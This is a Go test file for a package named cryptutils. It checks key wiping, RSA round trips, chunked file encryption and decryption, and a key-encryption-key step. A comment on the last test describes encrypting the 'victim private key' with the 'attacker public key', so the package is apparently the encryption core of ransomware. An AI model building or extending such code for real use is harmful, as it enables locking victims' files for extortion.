package cryptutils

import (
	"crypto/aes"
	_ "embed"
	"encoding/hex"
	"os"
	"path"
	"testing"
)

const dummy_string string = "The quick brown fox jumps over the lazy dog"

// Test if the key is correctly wiped.
func TestWipeKey(t *testing.T) {
	testbuf := []byte(dummy_string)
	WipeKey(&testbuf)
	if string(testbuf[:]) == dummy_string {
		t.Errorf("Failed to wipe key")
	}
}

// Test RSA encryption/decryption
func TestRsa(t *testing.T) {
	privkey, pubkey := GenerateKeyPair(2024) // very few bytes to make test quicker
	msg := []byte(dummy_string)

	ciphertext := EncryptWithPublicKey(msg, pubkey)

	if string(ciphertext[:]) == dummy_string {
		t.Errorf("Failed to encrypt data")
	}
	if string(DecryptWithPrivateKey(ciphertext, privkey)[:]) != dummy_string {
		t.Errorf("Failed to decrypt data")
	}
}

//go:embed cryptutils_test.go
var file_content []byte

// Test individual file encryption/decryption
func TestFileEncryption(t *testing.T) {
	for len(file_content) < 2*chunk_length || len(file_content)%aes.BlockSize == 0 {
		file_content = append(file_content, []byte("a")...)
	}
	tempdir, _ := os.MkdirTemp("", "sampledir")
	defer os.RemoveAll(tempdir)
	filename := path.Join(tempdir, "my_file.txt")
	os.WriteFile(filename, file_content, 0644)

	privkey, pubkey := GenerateKeyPair(8192)

	EncryptFile(filename, pubkey, "aaaaaaaaaaaaaaaaaa")
	DecryptFile(filename, privkey)
	out, _ := os.ReadFile(filename)

	if string(out) != string(file_content) {
		t.Errorf("Failed to decrypt data")
	}
}

// Test Key encryption Key mecanisms: encrypt victim private key woth attacker public key
func TestKek(t *testing.T) {
	master_privkey, master_pubkey := GenerateKeyPair(8192)
	privkey, _ := GenerateKeyPair(4096)
	encryptest_privkey := KekEncrypt(privkey, master_pubkey)

	enc_string := hex.EncodeToString(encryptest_privkey)
	dec_privkey := KekDecrypt(master_privkey, enc_string)
	if string(PrivateKeyToBytes(privkey)) != string(PrivateKeyToBytes(dec_privkey)[:]) {
		t.Errorf("Failed to decrypt data")
	}
}
